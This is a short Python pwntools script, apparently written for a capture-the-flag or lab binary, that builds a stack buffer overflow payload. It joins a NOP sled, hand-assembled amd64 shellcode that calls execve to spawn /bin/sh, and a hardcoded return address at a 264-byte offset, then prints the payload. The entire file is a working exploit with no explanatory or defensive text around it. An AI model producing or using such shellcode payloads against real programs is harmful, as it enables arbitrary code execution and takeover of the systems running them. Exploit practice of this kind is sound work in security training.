#!/usr/bin/env python
import sys
from pwn import *

#offset = sys.argv[1]
offset = 264
nop = '\x90'
return_addr = '\xe0\xde\xff\xff\xff\x7f'

shell = """
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    /*push 0x68*/
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
"""

#shell = shellcraft.amd64.linux.sh()
shellcode = asm(shell, arch='amd64', os='linux', bits=64)
payload = nop * (offset - len(shellcode)) + shellcode + return_addr

print payload
